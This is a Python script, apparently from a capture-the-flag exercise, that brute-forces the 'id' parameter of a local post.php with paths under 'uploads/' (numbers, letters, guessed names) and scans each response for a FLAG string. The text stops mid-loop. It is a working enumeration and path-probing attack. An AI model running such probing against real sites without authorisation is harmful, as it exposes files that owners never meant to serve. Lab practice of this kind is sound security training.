import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Systematic enumeration of uploads directory...")
print("[+] Testing numeric IDs 1-100...")

found_items = []

for i in range(1, 101):
    resp = requests.get(f"{base_url}/post.php", params={'id': f'uploads/{i}'})
    
    if "Post not found" not in resp.text and len(resp.text) > 50:
        print(f"\n[!] Found: uploads/{i}")
        print(f"Length: {len(resp.text)} bytes")
        found_items.append(i)
        
        # Check for flag
        if 'FLAG{' in resp.text:
            print("[!!!] FLAG FOUND!")
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            print(f"Flags: {flags}")
            print("\nFull response:")
            print(resp.text)
            break
        
        # Show preview if small enough
        if len(resp.text) < 500:
            print(f"Content: {resp.text[:300]}")

print(f"\n[+] Found {len(found_items)} items in uploads/ directory")

# Try alphanumeric IDs
print("\n[+] Testing alphanumeric IDs (a-z)...")
for letter in 'abcdefghijklmnopqrstuvwxyz':
    resp = requests.get(f"{base_url}/post.php", params={'id': f'uploads/{letter}'})
    if "Post not found" not in resp.text and len(resp.text) > 50:
        print(f"\n[!] Found: uploads/{letter}")
        print(f"Length: {len(resp.text)}")
        if 'FLAG{' in resp.text:
            print("[!!!] FLAG FOUND!")
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            print(f"Flags: {flags}")
            break

# Try UUIDs or hash-like patterns
print("\n[+] Testing common hash/ID formats...")
test_hashes = [
    "0",
    "00",
    "000",
    "1a2b3c",
    "abc123",
    "test",
    "admin",
    "root",
    "default",
    "temp",
    "tmp",
]

for hash_id in test_hashes:
